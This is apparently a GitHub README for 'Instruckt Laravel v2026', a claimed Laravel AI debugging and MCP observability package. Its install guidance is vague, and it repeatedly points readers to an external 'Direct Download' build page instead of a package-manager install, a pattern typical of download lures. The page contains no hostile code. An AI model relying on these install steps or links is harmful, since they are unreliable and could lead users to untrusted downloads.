# Instruckt Laravel v2026 - Laravel AI debugging tool 2026

> **Live visual debugging for Laravel AI development flows.** Instruckt Laravel brings observability, MCP tooling, and AI-friendly feedback together in a Laravel/PHP package built to help you review requests, metrics, and application state with version 2026.

[![Platform](https://img.shields.io/badge/Platform-Laravel%20%2F%20PHP-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/sam-jamestty1474/instruckt-laravel-mcp-debug-tool?style=flat-square)](https://github.com/sam-jamestty1474/instruckt-laravel-mcp-debug-tool)

---

<p align="center">
  <a href="https://sam-jamestty1474.github.io/instruckt-laravel-mcp-debug-tool/">
    <img src="https://img.shields.io/badge/Download-Instruckt%20Laravel%20Latest-brightgreen?style=for-the-badge" alt="Download Instruckt Laravel">
  </a>
</p>

> **[Direct Download - Instruckt Laravel v2026](https://sam-jamestty1474.github.io/instruckt-laravel-mcp-debug-tool/)**

---

[Download Latest Build](https://sam-jamestty1474.github.io/instruckt-laravel-mcp-debug-tool/)

---

## What Instruckt Laravel Does

Instruckt Laravel is an AI debugging and observability tool focused on Laravel. It gives you a visual way to inspect how your app behaves while requests, agents, and background activity are in motion. The goal is to keep runtime insight close to your development loop instead of forcing you to switch contexts.

It is aimed at Laravel and PHP developers who want a clearer view of request flow, database usage, cache activity, and memory patterns. With support for AI providers like OpenAI and Claude, along with MCP-centered tooling, it suits workflows where debugging, analysis, and agent interaction need to stay linked.

---

## Key Capabilities

- Visual debugging dashboard for inspecting runtime behavior in real time
- Model Context Protocol (MCP) tools for AI-assisted workflows
- Combined view of request, database, cache, and memory metrics
- Blade toolbar component for visibility inside the app
- Multi-provider AI integration, including OpenAI and Claude
- Multilingual support for teams working in different locales
- Storage support through files or database persistence
- Artisan analyze and watch commands for continuous review

---

## Installing

Add the package to a Laravel project by cloning or downloading the repository, then wire it into your application in the way that matches your project layout.

Typical setup flow:

1. Put the package into your Laravel workspace.
2. Register the package based on your project structure.
3. Run the supplied Artisan commands to start analysis and live watching.

Example launch note:

    php artisan instruckt:analyze
    php artisan instruckt:watch

If you are working from a local repository copy, download the latest build from the project page and connect it to your Laravel app before running the commands above.

---

## How to Use It

Once installed, use the dashboard and toolbar to follow what your application is doing while it runs.

Common workflow:

1. Open the app in a browser during local development.
2. Trigger requests, database actions, or cache interactions.
3. Review the visual dashboard for metrics and state changes.
4. Use the analyze command for a deeper snapshot of activity.
5. Keep the watch command running when you want ongoing feedback.

Example commands:

    php artisan instruckt:analyze
    php artisan instruckt:watch

If your project uses AI coding agents, connect the available MCP tools to your workflow so the tool can surface helpful context during development and debugging sessions.

---

## Configuration

You can tune the package through its settings and the storage option used by your Laravel application. Depending on how you set it up, data can be stored in files or in the database.

Example configuration shape:

    INSTRUCKT_STORAGE=file
    INSTRUCKT_PROVIDER=openai
    INSTRUCKT_LOCALE=en

Adjust provider, storage, and localization values to fit your environment and team preferences.

---

## Requirements

- Laravel / PHP environment
- Compatible local or server-based Laravel application
- A browser for viewing the dashboard and toolbar output
- Optional access to OpenAI or Claude, depending on your chosen provider
- File storage or database support for persisted data
- Standard Artisan command access

---

## FAQ

**How do I get updates?**  
Download the latest build from the project page and replace your current copy or package version as needed.

**Where do I change settings?**  
Look in the package configuration and in whichever storage layer you selected, whether file-backed or database-backed.

**What if the dashboard does not show data?**  
Make sure the package is installed properly, the Artisan watch command is running, and your app is producing the activity you want to inspect.

**Can I use it with AI tools?**  
Yes. Multi-provider AI integration and MCP-related tooling are included for agent-oriented workflows.

**Does it support multiple languages?**  
Yes, multilingual support is part of the feature set.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
